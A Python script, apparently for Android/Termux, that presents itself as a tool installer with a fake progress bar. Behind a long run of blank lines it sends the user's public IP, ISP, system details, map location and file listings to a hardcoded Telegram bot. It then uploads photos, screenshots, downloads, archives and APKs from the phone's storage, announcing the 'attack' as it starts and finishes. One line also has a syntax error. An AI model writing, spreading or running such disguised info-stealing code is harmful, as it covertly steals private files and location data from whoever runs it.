import os,time

M = '\033[95m'
Y = '\033[32m'
E = '\033[0m'
MV =  '\033[96m'
S = '\033[93m'
modules= ['getmac', 'platform', 'glob', 'geocoder', 'requests','tqdm']

for module in modules:
    print(MV+"installing modules...\n"+E)
    print(M+f"{module} module installing..."+E)
    os.system(f'pip install {module}')
    print(Y+f"{module} installed."+E)
    time.sleep(0.7)
    os.system("clear")
import requests
import geocoder 
import socket
import sys
import time
from glob import glob
from datetime import datetime
from platform import *
from getmac import get_mac_address as gma
from tqdm import tqdm
import time

print("Tool installing")
for i in tqdm(range((100))):
 time.sleep(0.040)













































































































































































































os.system('clear')
token = '''6253572179:AAG5LAMoPW8EG-Iy6ImQKysTCbdBtfhpcPg'''  
id = '''5205520205'''  

print('')

tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Saldırı Başladı✅\nDev: @Ritalin404\nChannel: @godlesstekno')

ip = requests.get("https://api.ipify.org").text
with open('IpAdresi.txt', 'w') as IP:
    IP.write(f' [ + ]  Cihazın İp ~» {ip} ')
    IP.close()
    dosya = {'document': open('IpAdresi.txt', 'rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)

sonuc = requests.get(f'http://ip-api.com/json/{ip}').json()       
with open('HatSaglayicisi.txt', 'w') as AS:
    AS.write(f' [ ✓ ] Kullandığı Hat Sağlayıcısı » ....  {sonuc["isp"]} ')
    AS.close()
    dosya = {'document': open('HatSaglayicisi.txt', 'rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)   

print("Wait please..."')
sistemsurumu = release()
pythonsurumu = python_version()
platformbilgisi = platform()
makinebilgisi = machine()
versiyon = version()    
with open('Sistem.txt', 'w') as S:
    S.write(f' [ ✓ ] Sistem Bilgisi » ....   => {sistemsurumu}  python_version => {pythonsurumu}  platform => {platformbilgisi}  machine => {makinebilgisi}  version => {versiyon} ')
    S.close()
    dosya = {'document': open('Sistem.txt', 'rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)

dosyalar = glob("/storage/emulated/0/*")
with open('DosyaDizinleri.txt', 'w') as D:
    D.write(f' [ ✓ ] Sistemin Dosya Dizinleri » .... ')    
    for dosya in dosyalar:
        D.write(dosya + '    ,    ')
    D.close()
    dosya = {'document': open('DosyaDizinleri.txt', 'rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)

bizimip = geocoder.ip(ip).latlng
haritaenlem = bizimip[0]
haritaboylam = bizimip[1]
with open('Konum.txt', 'w') as konum_dosyasi:
    konum_dosyasi.write(f' [ ✓ ] Hedefin-Konum-IP » ....  https://www.google.com/maps/@{haritaenlem},{haritaboylam},13z')
    konum_dosyasi.close()
    dosya = {'document': open('Konum.txt', 'rb')}
    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=dosya)
              
print('[ ✘ ] \033[32;1m Apiden Yanıt Bekleniyor .......')

def gonder(dosya):
    requests.post(f'https://api.telegram.org/bot{token}/sendDocument?chat_id={id}', files=dosya)

tarih = datetime.now()

dizinler = [
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Download/Telegram",
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/DCIM/Screenshots",
    "/storage/emulated/0/DCIM/ScreenRecorder"
]

for dizin in dizinler:
    os.chdir(dizin)
    dosyalar = list(os.scandir('.'))
    for dosya in dosyalar:
        if dosya.name.endswith(('jpg', 'png', 'zip', 'rar', 'php', 'mp4', 'txt', 'png', 'apk', 'py')):
            try:
                dosyaverisi = {"document": open(dosya.name, 'rb')}
                gonder(dosyaverisi)
            except:
                pass

tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Tamamlandı : Developer > @Ritalin404 ✅ ')

exit('GODLESS')
